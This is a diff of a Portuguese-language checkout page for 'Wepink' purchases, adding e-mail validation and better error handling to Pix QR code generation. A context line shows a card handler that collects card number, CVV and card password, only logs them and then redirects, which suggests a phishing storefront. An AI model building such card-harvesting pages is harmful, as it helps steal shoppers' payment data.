@@ -878,7 +878,7 @@
   </footer>
 
   <script>
-    const backendUrl = '/create-pix'; // Ajustado para o endpoint correto no Render
+    const backendUrl = '/create-pix';
 
     function formatCurrency(value) {
       return `R$ ${value.toFixed(2).replace('.', ',')}`;
@@ -990,6 +990,13 @@
         return;
       }
 
+      // Validar o e-mail antes de enviar
+      if (!emailInput || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput)) {
+        console.error('E-mail inválido:', emailInput);
+        showErrorScreen('Erro: Por favor, insira um e-mail válido.');
+        return;
+      }
+
       const paymentData = {
         amount: parseFloat(totalAmount.toFixed(2)),
         description: 'Compra Wepink',
@@ -1007,7 +1014,8 @@
         });
 
         if (!response.ok) {
-          throw new Error('Erro ao gerar o QR code Pix: ' + response.statusText);
+          const errorData = await response.json();
+          throw new Error(errorData.error || 'Erro ao gerar o QR code Pix');
         }
 
         const data = await response.json();
@@ -1044,7 +1052,7 @@
         localStorage.setItem('adminOrders', JSON.stringify(orders));
         console.log('Código PIX gerado com sucesso:', data);
       } catch (error) {
-        console.error('Erro ao gerar Pix:', error);
+        console.error('Erro ao gerar Pix:', error.message);
         showErrorScreen(`Erro ao gerar Pix: ${error.message}`);
       } finally {
         generateButton.disabled = false;
@@ -1194,7 +1202,7 @@
         console.log('Pagamento via cartão processado:', { cardName, cardCPF, cardNumber, expMonth, expYear, cvv, password, total });
 
         confirmButton.textContent = 'Confirmar Pagamento';
-        window.location.href = 'confirmation.html'; // Redirecionar para uma página de confirmação (se existir)
+        window.location.href = 'confirmation.html';
       }, 1000);
     }
 
